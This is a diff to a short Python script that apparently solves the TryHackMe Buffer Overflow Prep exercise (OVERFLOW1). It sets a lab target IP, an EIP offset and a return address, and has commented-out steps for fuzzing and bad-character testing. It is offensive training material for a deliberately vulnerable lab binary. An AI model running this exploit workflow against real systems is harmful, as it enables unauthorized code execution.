@@ -1,12 +1,7 @@
-"""
-Working solution for TryHackMe Buffer Overflow Prep, oscp.exe - OVERFLOW1
-"""
-
-
 import buff
 
 
-target = ("127.0.0.1", 1337)
+target = ("10.10.6.56", 1337)
 runner = buff.Buff(target = target, prefix = "OVERFLOW1 ")
 
 
@@ -22,11 +17,15 @@ runner.setEipOffset(1978)
 # runner.fuzz()
 
 
-# ----- 2. Send Bad Characters -----
+# # ----- 2. Send Unique Characters -----
+# runner.sendPattern()
+
+
+# ----- 3. Send Bad Characters -----
 # runner.sendBadChars()
 
 
-# ----- 3. Reapl Exploit ------
+# ----- 4. Reapl Exploit ------
 eip_address = "\xaf\x11\x50\x62"
 runner.setEipAddress(eip_address)
 
